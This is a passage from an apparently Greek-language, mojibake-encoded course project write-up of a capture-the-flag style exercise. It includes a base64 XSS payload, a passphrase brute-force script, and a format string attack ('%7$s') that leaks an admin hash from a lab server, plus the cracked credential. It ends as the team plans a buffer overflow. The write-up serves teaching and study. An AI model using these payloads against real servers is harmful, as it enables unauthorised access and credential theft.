   ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î±.
   
   Payload: **PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjo1YzE0MGQzNWRjYjQ2YTYyMmUyY2VkZjVlZjVjYzM2MzhjZGZmZDFjMTE4YzkzMzFmOGM4NDY2OWYwYjc0Nzgz**

   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/5-Cookie_XSS.png)
   
<br/>

10. Î‘Ï€ÏŒ Ï„Î¿ ÎºÎ±Î¹Î½Î¿ÏÏÎ³Î¹Î¿ path Ï€Î¿Ï… Î²ÏÎ®ÎºÎ±Î¼Îµ, ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎ±Î¼Îµ ÏŒÎ»Î± Ï„Î± Î±ÏÏ‡ÎµÎ¯Î±.
    
    Î’ÏÎ®ÎºÎ±Î¼Îµ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ **passphrase.key.truncated**, Ï„Î¿ Ï€ÏÏÏ„Î¿ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… hash Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Î¼Îµ Ï„Î¿Î½ Î¿Ï€Î¿Î¯Î¿ ÎµÎ³Î¹Î½Îµ Ï„Î¿ _gpg encryption_.
    
    Î‘ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ Î¿Î´Î·Î³Î¯ÎµÏ‚, Ï€Î®ÏÎ±Î¼Îµ Ï„Î¿ secret **"raccoon"** Ï€Î¿Ï… Î±Î½Î±Ï†ÎµÏÏŒÏ„Î±Î½ ÏƒÏ„Î¿ 2<sup>Î¿</sup> onion ÎºÎ±Î¹ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎ±Î¼Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î·Î¼ÎµÏÎ¿Î¼Î·Î½Î¯ÎµÏ‚ 
    Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î±Ï‚ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Ï„Ï‰Î½ **.truncated** ÎºÎ±Î¹ Ï„Ï‰Î½ Ï…Ï€Î¿Î»Î¿Î¯Ï€Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÎºÎ±Î¹ ÎµÎºÎµÎ¯Î½ÎµÏ‚ Ï€Î¿Ï… Î±Î½Î±Ï†Î­ÏÎ¿Î½Ï„Î±Î½ ÏƒÏ„Î± ÎºÎµÎ¯Î¼ÎµÎ½Î±, Î±Î»Î»Î¬ ÎµÏ€ÎµÎ¹Î´Î® ÎºÎ±Î¼Î¯Î± Î´ÎµÎ½ 
    Î­ÎºÎ±Î½Îµ Ï„Î·Î½ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ·, Ï†Ï„Î¹Î¬Î¾Î±Î¼Îµ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ script Ï€Î¿Ï… Î­ÎºÎ±Î½Îµ Î­Î½Î± _mini brute force_ Î¼Îµ Î·Î¼ÎµÏÎ¿Î¼Î·Î½Î¯ÎµÏ‚ Î±Ï€ÏŒ 2020-01-01 -> 2020-06-31
    (ÎºÎ±Î¸ÏÏ‚ Î· Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± Ï„ÏÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÎºÎ±Î¹ Ï„Ï‰Î½ Î´ÏÎ¿ onion ÎµÎ¯Î½Î±Î¹ ÏƒÏ„Î¹Ï‚ 2020-06-xx) ÎºÎ±Î¹ Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„ÎµÎ»Î¹ÎºÎ¬ Ï„Î· ÏƒÏ‰ÏƒÏ„Î® Î·Î¼ÎµÏÎ¿Î¼Î·Î½Î¯Î±.
    
    ```python
    from hashlib import sha256

    for i in range(1,7):
       for j in range(1,32):
          passphrase = "2020-0" + str(i) + "-"

          if j < 10:
             passphrase = passphrase + "0" + str(j)
          else:
             passphrase = passphrase + str(j)
             passphrase = passphrase + " raccoon"
             key = sha256(passphrase.encode('utf8').rstrip()).hexdigest()

             if "d1689c23e86421529297" in key:
                print(passphrase)
                print(key)
                exit()
    ```

    Î•Î»Î­Î³Ï‡Î±Î¼Îµ Î±Î½ Ï„Î¿ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹ Ï„Î¿Ï… hash Ï€Î¿Ï… ÎµÎ¯Ï‡Îµ Ï„Î¿ _truncated file_ Ï€ÎµÏÎ¹Î­Ï‡ÎµÏ„Î±Î¹ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Ï†Ï„Î¹Î¬Î¾Î±Î¼Îµ ÎºÎ±Î¹ ÎµÏÎºÎ¿Î»Î± Î²ÏÎ¯ÏƒÎºÎ¿Ï…Î¼Îµ
    Ï„Î·Î½ Î·Î¼ÎµÏÎ¿Î¼Î·Î½Î¯Î± Î½Î± ÎµÎ¯Î½Î±Î¹: **2020-02-12**

    ÎˆÏ„ÏƒÎ¹ Î­Ï‡Î¿Î½Ï„Î±Ï‚ ÏŒÎ»Î¿ Ï„Î¿ passphrase ÎºÎ±Î¹ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Ï„Î¿ hashing Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ decrypt Ï„Î± .gpg Î±ÏÏ‡ÎµÎ¯Î±. \
    **passphrase**: 2020-02-12 raccoon \
    **hash**&emsp;&emsp;&nbsp;&nbsp;&nbsp;: d1689c23e86421529297f3eb35db2fe261de9cbe19487d923c464d96ca00e138

<br/>

11. Î‘Î½Î¿Î¯Î³Ï‰Î½Ï„Î±Ï‚ Ï„Î¿ **signal.log** Î²ÏÎ¯ÏƒÎºÎ¿Ï…Î¼Îµ Ï„Î·Î½ Î±Î½Î±Ï†Î¿ÏÎ¬ ÏƒÏ„Î¿ commit Î¼Îµ Î±ÏÎ¹Î¸Î¼ÏŒ: **2355437c5f30fd2390a314b7d52fb3d24583ef97**
    
    Î Î±ÏÏŒÎ»Î¿ Ï€Î¿Ï… ÏƒÎ¯Î³Î¿Ï…ÏÎ± ÎºÎ¬Ï€Î¿Î¹Î¿ ÏÏŒÎ»Î¿ Î¸Î± Î´Î¹Î±Î´ÏÎ±Î¼Î¬Ï„Î¹Î¶Îµ ÎºÎ±Î¹ Ï„Î¿ **firefox.log**, Î±ÏÏ‡Î¹ÎºÎ¬ Î±ÏÏ‡Î¯ÏƒÎ±Î¼Îµ Î½Î± ÏˆÎ¬Ï‡Î½Î¿Ï…Î¼Îµ Ï„Î± repos Ï„Ï‰Î½ ÎºÎ±Î¸Î³Î·Ï„ÏÎ½ ÎºÎ±Î¹ Ï„Ï‰Î½ 
    Î²Î¿Î·Î¸ÏÎ½ Î¼Î­Ï‡ÏÎ¹ Ï€Î¿Ï… Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ commit Î¼Îµ Ï„Î¿ Î¯Î´Î¹Î¿ hash.
    
    EÎ½ Ï„Î­Î»ÎµÎ¹, Ï€ÏÎ¿Ï†Î±Î½ÏÏ‚ ÎºÎ±Î¹ Ï…Ï€Î®ÏÏ‡Îµ ÎºÎ±Î¹ ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **firefox.log**, Ï€Î¿Ï… Î¼Îµ Î­Î½Î± `search github` Î­Î²Î³Î±Î¶Îµ Ï„Î¿ Î»Î¹Î½Îº Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î® Î¼Î­ÏƒÏ‰
    terminal ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚: `sort firefox.log | uniq` Î® `grep github firefox.log`, ÎµÎ¼Ï†Î¬Î½Î¹Î¶Îµ Ï„Î¿ link Ï„Î¿Ï… github.

      > \>\> sort firefox.log | uniq \
      >      https://en.wikipedia.org/wiki/The_Conversation \
      >      https://github.com/asn-d6/tor

      > \>\> grep github firefox.log \
      >      https://github.com/asn-d6/tor

<br/>

12. Î¤Î­Î»Î¿Ï‚, Î²ÏÎ¯ÏƒÎºÎ¿Î½Ï„Î±Ï‚ Ï„Î¿ commit Î±Ï…Ï„ÏŒ, Î²ÏÎ¯ÏƒÎºÎ±Î¼Îµ Ï„Î¹Ï‚ Ï„ÎµÎ»Î¹ÎºÎ­Ï‚ Î¿Î´Î·Î³Î¯ÎµÏ‚ Î³Î¹Î± Ï„Î·Î½ ÎµÏÏÎµÏƒÎ· Ï„Î·Ï‚ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±Ï‚ Ï„Î¿Ï… Î“Î¹ÏÏÎ³Î¿Ï…. 
    Î‘ÎºÎ¿Î»Î¿Ï…Î¸ÏÎ½Ï„Î±Ï‚ ÎµÏÎºÎ¿Î»Î± Ï€Î»Î­Î¿Î½ Ï„Î± 4 Î²Î®Î¼Î±Ï„Î± Ï€Î¿Ï… ÎµÎ¯Ï‡Îµ Î¼Î­ÏƒÎ± ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î¬ÏƒÎ±Î¼Îµ Î¼Îµ Î­Î½Î± script Ï„Î¹Ï‚ ÏƒÏ…Î½Ï„ÎµÏ„Î±Î³Î¼Î­Î½ÎµÏ‚ Ï„Î¿Ï… ÎºÎ±Î¹ Î¿Î»Î¿ÎºÎ»Î·ÏÏÏƒÎ±Î¼Îµ Ï„Î¿ ÎµÏÏÏ„Î·Î¼Î±!
    
    ```python
    from hashlib import sha256

    key = sha256(b"cybergh0sts").hexdigest()

    x = "0." + str(key[:16])
    y = "0." + str(key[16:32])

    mult = 1/16
    lat  = 0.0
    long = 0.0
    for i in range(2,18):
        lat  = lat  + int(x[i],16) * mult
        long = long + int(y[i],16) * mult
        mult = mult / 16

    print("Latitude : %.30lf"%lat)
    print("Longitude: %.30lf"%long)
    ```

    **Location**&nbsp;&nbsp;: Vaux-Saules, 21440, France\
    **Latitude**&nbsp;&nbsp;&nbsp;: 47.47298416481722560089\
    **Longitude**: &nbsp;&nbsp;4.7991375472458345437

---
---

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 2 (Missing part for completing Plan X)

1. Î‘ÏÏ‡Î¹ÎºÎ¬ ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ±Î¼Îµ Ï„Î¿Ï€Î¹ÎºÎ¬ Ï„Î¿Î½ **pico server** ÎºÎ±Î¹ ÎºÎ±Ï„Î¬ Ï„Î¿ compilation ÎµÎ¼Ï†Î±Î½Î¯ÏƒÏ„Î·ÎºÎµ Î­Î½Î± warning Ï€Î¿Ï… Î¼Î±Ï‚ Î­Î´Ï‰ÏƒÎµ Ï„Î¿ 1<sup>Î¿</sup> Î²Î®Î¼Î± 
   Î³Î¹Î± Ï„Î¿ attack Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ.
   
   &emsp; ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/6-FSA_Warning.png)
    
<br/>

2. ÎœÎµÏ„Î¬ Î´Î¹Î±Î²Î¬Î¶Î¿Î½Ï„Î±Ï‚ ÎºÎ±Î¹ Ï„Î¿ Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î¿ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹ ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ Î­Ï€ÎµÎ¹Ï„Î± Î±Ï€ÏŒ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® Î±Î½Î±Î¶Î®Ï„Î·ÏƒÎ·, Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Î­Î½Î± Ï€Î¿Î»Ï Î¹ÏƒÏ‡Ï…ÏÏŒ attack Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± 
   Î³Î¯Î½ÎµÎ¹ ÏƒÎµ Î¼Î¹Î± Ï„Î­Ï„Î¿Î¹Î± ***printf***, ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **Format String Attack**. [<sup>\[5\]</sup>](#5--httpsowasporgwww-communityattacksformat_string_attack)[<sup>\[6\]</sup>](#6--httpscs155stanfordedupapersformatstring-12pdfpage11)
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/7-Format_String_attack.png)
   
<br/>

3. ÎœÎ­ÏƒÏ‰ Î±Ï…Ï„Î¿Ï, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ reveal Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Î¿Î»ÏŒÎºÎ»Î·ÏÎ¿Ï… Ï„Î¿Ï… stack. ÎˆÏ„ÏƒÎ¹, Î¼Ï€Î¿ÏÎ­ÏƒÎ±Î¼Îµ Î½Î± ÎµÎºÏ„Ï…Ï€ÏÏƒÎ¿Ï…Î¼Îµ Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± 
   Ï€Î¿Ï… Î´Î¯Î½ÎµÏ„Î±Î¹ ÏƒÎ±Î½ ÏŒÏÎ¹ÏƒÎ¼Î± ÏƒÏ„Î·Î½ `check_auth()` (Line users\[\]), Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ username ÎºÎ±Î¹ Ï„Î¿ password Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï†Î¿ÏÏ„Ï‰Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿ 
   Î±ÏÏ‡ÎµÎ¯Î¿ **/etc/htpasswd**. 
   
<br/>

4. ÎœÎ­ÏƒÏ‰ Ï„Î¿Ï… ***gdb*** Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„Î± offsets Ï€Î¿Ï… Ï‡ÏÎµÎ¹Î±Î¶ÏŒÎ¼Î±ÏƒÏ„Îµ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Ï„Î·Ï‚ Î¸Î­ÏƒÎ·Ï‚ Î¼Î½Î®Î¼Î·Ï‚ ÏƒÏ„Î· stack ÏƒÏ„Î·Î½ Î¿Ï€Î¿Î¯Î± ÎµÎ¯Î½Î±Î¹ 
   Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½ÎµÏ‚ Î¿Î¹ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.
   
   Î•Î¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Ï„Î± Î´ÏÎ¿ Î¿ÏÎ¯ÏƒÎ¼Î±Ï„Î± Ï„Î·Ï‚ `check_auth()` Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¹Ï‚ Î¸Î­ÏƒÎµÎ¹Ï‚: **$ebp + 0x8** (***Line users\[\]***) ÎºÎ±Î¹ **$ebp + 0xc** 
   (***auth_header***), ÏƒÏ„Î¿ ÎºÎ¬Ï„Ï‰ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… stack frame Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚, ÏƒÏ„Î¹Ï‚ Î¸Î­ÏƒÎµÎ¹Ï‚: **$ebp - 0x5c** ÎºÎ±Î¹ **$ebp - 0x60** Î±Î½Ï„Î¹ÏƒÏ„Î¿Î¯Ï‡Ï‰Ï‚.
   
   <h6>Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎ·: Î¤Î¿ stack frame Î­Ï‡ÎµÎ¹ Î±ÏÏ‡Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼Îµ <b>0x64 = 100 bytes</b></h6>
   
   > ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/8-Arguments_Copy.png)
   
<br/>

5. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î²ÏÎ®ÎºÎ±Î¼Îµ, ÏŒÏ„Î¹ Î· Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® **auth_username**, Ï€Î¿Ï… Î´Î¯Î½ÎµÏ„Î±Î¹ ÏƒÎ±Î½ ÏŒÏÎ¹ÏƒÎ¼Î± ÏƒÏ„Î·Î½ `printf()` Ï„Î·Î½ Î¿Ï€Î¿Î¯Î± Î¸Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ¼Îµ, 
   Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÏ„Î· Î¸Î­ÏƒÎ·: **$ebp - 0x40**. 
   
   Î†ÏÎ± Ï…Ï€Î¿Î»Î¿Î³Î¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ **offset** Î¼ÎµÏ„Î±Î¾Ï Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î¸Î­ÏƒÎµÏ‰Î½ Î²ÏÎ®ÎºÎ±Î¼Îµ ÏŒÏ„Î¹ Î²Î¬Î¶Î¿Î½Ï„Î±Ï‚ ÏƒÎ±Î½ payload: **%7$s**, Î¸Î± Î¼Î±Ï‚ ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿
   Ï„Î¿Ï… Ï€Î¯Î½Î±ÎºÎ± **users\[\]**.
   
   > ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/9-FSA_Arg_Position.png)
   
<br/>

6. Î¤Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î¿Ï… request Î¼Î±Ï‚ ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿Ï…Ï‚ Mozilla ÎºÎ±Î¹ Tor Browsers ÏƒÏ„Î¿ prompt Ï€Î¿Ï… Î´ÏÏƒÎ±Î¼Îµ, Î±Î»Î»Î¬ ÎºÎ±Î¹ ÏƒÏ„Î± **Response Headers**.
     
   ÎˆÏ„ÏƒÎ¹ Ï€Î®ÏÎ±Î¼Îµ Ï„Î¿ ÎµÎ¾Î®Ï‚ response: **admin:f68762a532c15a8954be87b3d3fc3c31**

   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/10-Prompt_FSA_Results.png)
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/11-Headers_FSA_Results.png)

<br/>

7. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î¼Î­ÏƒÏ‰ ÎºÎ¬Ï€Î¿Î¹Ï‰Î½ online ***md5 databases***, Î²ÏÎ®ÎºÎ±Î¼Îµ Ï„Î¿ decryption Ï„Î¿Ï… hashed password Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹: **you shall not pass**.
   
   ÎˆÏ„ÏƒÎ¹, Ï€ÎµÏÎ¬ÏƒÎ±Î¼Îµ Ï„Î¿Î½ Î±ÏÏ‡Î¹ÎºÏŒ Î­Î»ÎµÎ³Ï‡Î¿ ÎºÎ±Î¹ Ï€Î®ÏÎ±Î¼Îµ Ï„Î¿ **index.html**, Ï€Î¿Ï… Ï€ÎµÏÎ¹ÎµÎ¯Ï‡Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿ ***Missing Part for Plan X***!
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/12-Plan_X.png)|
   |-|

---
---

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 3 (Preliminary Results of Plan Y)

1. Î‘ÏÏ‡Î¹ÎºÎ¬ ÎºÎ±Î¹ ÎµÎ´Ï, Î¾ÎµÎºÎ¹Î½Î®ÏƒÎ±Î¼Îµ Î´Î¿ÎºÎ¹Î¼Î¬Î¶Î¿Î½Ï„Î±Ï‚ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ **SQL Injection** Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ¿Ï…Î¼Îµ Ï„Î¿Î½ Î­Î»ÎµÎ³Ï‡Î¿.

2. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¾Î±Î½Î±Î´Î¹Î±Î²Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ±, ÎµÎ¯Î´Î±Î¼Îµ Ï€Ï‰Ï‚ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ Ï€Î¯Î½Î±ÎºÎ±Ï‚ **admin_pwd[1]** Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Ï„Î¿ Î¯Î´Î¹Î¿ ÏŒÎ½Î¿Î¼Î± Î¼Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… 
   prompt Ï€Î¿Ï… Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î± Ï„Î¿Ï… 3<sup>Î¿Ï…</sup> .onion link.
   
   Î’Î»Î­Ï€Î¿Î½Ï„Î±Ï‚ ÎºÎ±Î¹ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `post_param()` Ï€Î¿Ï… ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ Î±Î¼Î­ÏƒÏ‰Ï‚ Î¼ÎµÏ„Î¬, ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Î³Î¯Î½ÎµÏ„Î±Î¹ Î­Î½Î± ***memcpy*** Î¼Îµ Î¼Î­Î³ÎµÎ¸Î¿Ï‚ ÏŒÏƒÎ¿
   Ï„Î¿ ÎµÎºÎ¬ÏƒÏ„Î¿Ï„Îµ payload ÎºÎ±Î¹ Ï€Î±ÏÎ¬Î»Î»Î·Î»Î± Î¼ÎµÏ„Î±Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Î¹ Ï„Î± **&**,**=** ÏƒÎµ **\0** Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎµÏ‚. ÎˆÏ„ÏƒÎ¹, ÎºÎ±Ï„Î±Î»Î¬Î²Î±Î¼Îµ ÏŒÏ„Î¹ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎºÎ¬Î½Î¿Ï…Î¼Îµ **Buffer Overflow**!
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/13-Prompt_Name.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/14-Pico_SameName_Array.png)|
   |-|-|
<br/>

3. Î ÏÏÏ„Î± Î­Ï€ÏÎµÏ€Îµ Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï„Î¹Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¿ server, Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ­Ï‚ Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ Î­Î³Î¹Î½Îµ Ï„Î¿ build ÎºÎ±Î¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î±
   Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± ÏƒÏ„Î¿ Î¿Ï€Î¿Î¯Î¿ Î­Î³Î¹Î½Îµ. 
   
   Î”Î¹Î±Î²Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ Makefile ÎµÎ¯Î´Î±Î¼Îµ ÏŒÏ„Î¹ Î´Îµ Î³Î¯Î½ÎµÏ„Î±Î¹ ÎºÎ¬Ï€Î¿Î¹Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Ï‰Î½ **stack-protectors (canaries)**, Ï„Î¿Ï… **ASLR** ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Î¿Ï… 
   **Executable Stack** Î¿Ï€ÏŒÏ„Îµ ÎºÎ±Ï„Î±Î»Î¬Î²Î±Î¼Îµ ÏŒÏ„Î¹ Î¸Î± Î®Ï„Î±Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î±. [<sup>\[7\]</sup>](#7--httpsenwikipediaorgwikiStack_buffer_overflowProtection_schemes)
   
   - MÎ­ÏƒÏ‰ Ï„Î¿Ï… gdb ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÎ±Î¼Îµ ÏŒÏ„Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ **canaries** Î³Î¹Î± Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¹ÏƒÏ„Î¿ÏÎ½ Î¿Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ Ï€Î¯Î½Î±ÎºÎµÏ‚ ÎºÎ±Î¹ Î¼Î¬Î»Î¹ÏƒÏ„Î± 
     Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ***Random Terminator Canaries*** Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ†Î­ÏÎ¿Ï…Î½ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎ· Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î± ÏŒÏ„Î±Î½ Î³Î¯Î½ÎµÏ„Î±Î¹ Ï‡ÏÎ®ÏƒÎ· ÎºÎ¬Ï€Î¿Î¹Î±Ï‚ `strcpy()`.
   
   - ÎšÎ¬Î½Î¿Î½Ï„Î±Ï‚ 2-3 Ï†Î¿ÏÎ­Ï‚ Ï„Î¿ **Format String Attack (FSA)** Ï€Î¿Ï… Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†Î·ÎºÎµ ÏƒÏ„Î¿ Part_2, ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÎ±Î¼Îµ ÎºÎ±Î¹ Ï„Î·Î½ ÏÏ€Î±ÏÎ¾Î· Ï„Î¿Ï… **ASLR**.
   
   - Î£Ï„Î· Î´ÎµÎ»Î¯Î´Î± Ï€Î¿Ï… Î¼Ï€Î®ÎºÎ±Î¼Îµ Ï€ÎµÏÎ½ÏŒÎ½Ï„Î±Ï‚ Ï„Î¿ Î’Î®Î¼Î± 2, Ï€ÎµÏÎ¹Î­Ï‡Î¿Î½Ï„Î±Î½ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ­Ï‚ Î¼Îµ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± ÏƒÏ„Î¿ Î¿Ï€Î¿Î¯Î¿ Î­Î³Î¹Î½Îµ Ï„Î¿ build Ï„Î¿Ï… pico server, Ï„Î·Ï‚ 
     Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ Ï„Î¿Ï… gcc Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ ÎºÎ±Î¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Î¼Î·Ï‡Î±Î½Î®Î¼Î±Ï„Î¿Ï‚ ÏƒÏ„Î¿ Î¿Ï€Î¿Î¯Î¿ Î­Î³Î¹Î½Îµ.
     
     |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/15-Pico_Server_Build_Info.png)|
     |-|
     
